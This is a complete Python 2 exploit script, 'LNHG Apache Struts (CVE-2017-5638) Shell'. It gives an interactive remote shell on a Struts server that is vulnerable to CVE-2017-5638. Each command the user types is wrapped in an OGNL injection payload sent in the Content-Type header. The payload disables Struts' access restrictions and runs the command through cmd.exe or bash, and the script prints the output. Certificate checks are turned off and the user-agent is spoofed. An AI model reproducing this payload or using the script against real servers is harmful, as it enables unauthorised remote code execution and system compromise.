#!/usr/bin/python
#
# LowNoiseHG Apache Struts (CVE-2017-5638) Shell v.0.1 (2017/03/17)
# by F4Lc0N - LNHG - USA/Colombia
#
# Thanks to Andrew Weidenhamer (@AWeidenhamer), David Llorens (c4an), Tauseef Ghazi (@tghazi), and AJ (@nikamajinkya) for inspiration, ideas and debugging/betatesting help.

import argparse
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import re
import sys

errorstring = 'usage: StrutsShell.py [-h] [-d] [-u STRUTS-URL]\n                  StrutsShell.py: error:'

def arguments():
  global args, debug
  parser = argparse.ArgumentParser(description='LNHG Apache Struts (CVE-2017-5638) Shell v.0.1')
  parser.add_argument('-d','--debug', action='store_true', help='show debugging info')
  parser.add_argument('-u','--url', help='Apache Struts vulnerable URL (i.e.: http://www.example.com/test/login.action)')
  args = parser.parse_args()
  debug = args.debug
  if not args.url:
    print errorstring,
    print 'an Apache Struts URL is required (i.e.: http://www.example.com/test/login.action)'
    sys.exit(0)

def main():
  global args, debug
  arguments()
  host = re.findall(r'//([a-zA-Z0-9.]+)/',args.url)[0]
  while 1:
    cmd = raw_input(host + '$ ')
    payload = "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#shell='"+str(cmd)+"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#shells=(#iswin?{'cmd.exe','/c','"+str(cmd)+"'}:{'/bin/bash','-c','"+str(cmd)+"'})).(#p=new java.lang.ProcessBuilder(#shells)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
    headers = {'User-agent' : 'Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5', 'Content-Type': str(payload)}
    if debug: print headers
    r = requests.get(args.url,headers=headers,verify=False)
    if debug: print r
    print r.text

if __name__ == "__main__":
    main()
